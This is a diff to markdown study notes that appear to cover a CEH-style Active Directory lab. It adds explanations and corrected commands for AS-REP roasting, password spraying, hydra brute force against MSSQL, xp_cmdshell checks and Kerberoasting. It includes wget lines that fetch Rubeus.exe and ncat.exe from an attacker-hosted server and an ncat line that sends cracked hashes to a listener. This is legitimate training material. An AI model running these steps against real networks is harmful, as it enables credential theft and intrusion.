@@ -589,6 +589,8 @@ nmap -sC -A -sV <DC-IP>
 
 ### AS-REP Roasting Attack
 
+> Finding accounts with no kerberos preauth required and will request the TGT from DC, TGT will be encrypted by users password hash and will crack the hash to get users password.
+
 ```bash
 cd impacket/examples
 ```
@@ -614,6 +616,7 @@ john --wordlist=/root/ADtools/rockyou.txt hash.txt
 > --wordlist = define the /path/to/filename where the wordlist is stored
 
 ### Password Spraying
+> From the Nmap results we can observe that other hosts in the subnet are running services such as RDP, SSH, and FTP. Therefore, we can perform password spraying on each service individually to check for correct credentials If the cracked password for one account is “cupcake”, we try to find any users on the AD network that use the same password with RDP enabled.
 
 #### CrackMapExec
 
@@ -642,10 +645,13 @@ try connecting to the ip address
 
 here we are hosting a simple [[portable python server]]
 ```bash
+cd /root/ADtools/
 python3 -m http.server 80
 ```
 > u can specify the port at the end
 > defaults to 8000
+
+In RDP, download the PowerView.ps1 script and run the powershell
 
 go to any browser on the target machine (connected via rdp here during the previous phase)
 ```
@@ -706,6 +712,7 @@ tool used
 
 → save the name SQL_srv in a .txt file names user.txt
 ```bash
+echo SQL_srv > user.txt
 hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
 ```
 > -L = specifies the username list
@@ -725,7 +732,7 @@ python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30
 
 execute into the shell obtained from python script
 ```
-SELECT name, CONVERT(INT, ISNULL(value. value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell'
+SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
 ```
 > if this returns 1, it indicates that the xp_cmdshell is enabled on the server
 
@@ -804,6 +811,8 @@ whoami
 
 ### Perform Kerberoasting
 
+> Rubeus is a tool for exploiting Kerberos weaknesses in Windows environments. Kerberoasting is a method to extract ticket granting ticket (TGT) hashes from AD. Attackers target service accounts with associated Kerberos service principal names (SPNs). TGTs are requested from the DC for these accounts, then cracked offline to reveal user passwords. Kerberoasting exploits weak service account passwords and the nature of Kerberos authentication.
+
 in the netcat shell obtained in the last attack
 
 ```
@@ -814,10 +823,10 @@ cd ../.. ; cd Users\Public\Downloads
 ```
  we need to download 2 more executables
 ```
-wget http://10.10.1.13:8000 Rubeus.exe -o rebeus.exe
+wget http://10.10.1.13:8000/Rubeus.exe -o rebeus.exe
 ```
 ```
-wget http://10.10.1.13:8000 ncat.exe -o ncat.exe
+wget http://10.10.1.13:8000/ncat.exe -o ncat.exe
 ```
 
 ```
@@ -841,7 +850,7 @@ nc -lvp 9999 > hash.txt
 
 in the compromised shell
 ```
-ncat.exe -w 10.10.1.13 9999 < hash.txt
+ncat.exe -w 3 10.10.1.13 9999 < hash.txt
 ```
 
 → in the netcat listener shell press `Enter`
